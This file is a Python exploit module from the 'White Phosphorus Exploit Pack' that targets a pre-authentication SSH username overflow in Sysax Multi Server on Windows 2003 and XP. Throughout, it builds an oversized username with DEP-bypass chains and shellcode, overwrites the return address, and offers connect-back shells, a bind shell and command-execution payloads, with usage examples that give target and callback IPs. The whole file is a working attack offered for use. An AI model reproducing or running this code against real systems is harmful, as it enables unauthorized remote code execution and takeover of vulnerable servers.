
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
import libs.paramiko as paramiko


NAME = "Sysax Multi Server SSH Pre Auth Remote Overflow"
DESCRIPTION = "Exploits a pre auth remote overflow in the Sysax Multi Server SSH Service"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Codeorigin, LLC'
DOCUMENTATION["Date public"] = "2012-02-28"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://www.pwnag3.com/2012/02/sysax-multi-server-ssh-username-exploit.html"
DOCUMENTATION["Notes"] = """
ASLR prevents Vista/7 targets
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP" ]

NOTES="""
ASLR prevents Vista/7 targets.

---------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Sysax Multi Server SSH Pre Auth Remote Overflow
---------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Autoversioning
1: Windows 2003 SP1-SP2
2: Windows XP SP2-SP3

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_sysax_multiserver_ssh/wp_sysax_multiserver_ssh.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 22

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Autoversioning", (0x0000), []],
    1 : ["Windows 2003 SP1-SP2 (DEP)", (0x0000), [WIN2K3SP1, WIN2K3SP2]],
    2 : ["Windows XP SP2-SP3 (DEP)", (0x0000), [WINXPSP2, WINXPSP3]]
}

class theexploit(wp_exploit):
    PAYLOADS = ["TCP Connect Back",
                "IE Inject Connect Back",
                "HTTPMOSDEF SSL",
                "HTTPMOSDEF PLAIN",
                "Bind MOSDEF Shell",
                "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.encode_printable = True
        self.password = "".join( [ random.choice(string.lowercase) for x in range(8) ] )
        return

    def usage(self):
        self.wp_usage(targets)
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def neededListenerTypes(self):
        self.getArgs()    
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        if self.version == 0:
            return 0

        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()   

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        if self.version == 0 and not self.autoVersioned:
            self.version = self.wp_autoVersionTarget(targets)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = ''
        if self.version == 1:
            payload = wp_randomstring(916)
            payload += self.wp_UniversalDEPBypassWin2k3_VP(len(self.shellcode)+8)
        elif self.version == 2:
            payload = wp_randomstring(908)
            payload += self.wp_UniversalDEPBypassWinXP_VP(len(self.shellcode)+8)    
        payload += self.shellcode
        payload += 'B'*(9208-len(payload))
        payload += pack('<L', 0x0049F411) # add esp, 0xD90
        return payload

    def run(self):
        self.getArgs()

        if self.version == 0:
            self.log("WP> Autoversioning failed.")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        payload = self.makesploit()
        self.result_error = 0
        try:
            self.s = self.gettcpsock()
            self.s.connect((self.host, self.port))
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        try:
            self.log("WP> Setting up SSH transport")
            self.transport=paramiko.Transport(self.s)
        except:
            self.log("WP> Transport failed")
            return 0
        
        self.log("WP> Sending Exploit")
        try:
            self.transport.connect(username=payload,password=self.password)
            time.sleep(2)
            self.transport.close()
        except:
            ignore = ''
            
        time.sleep(5)

        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
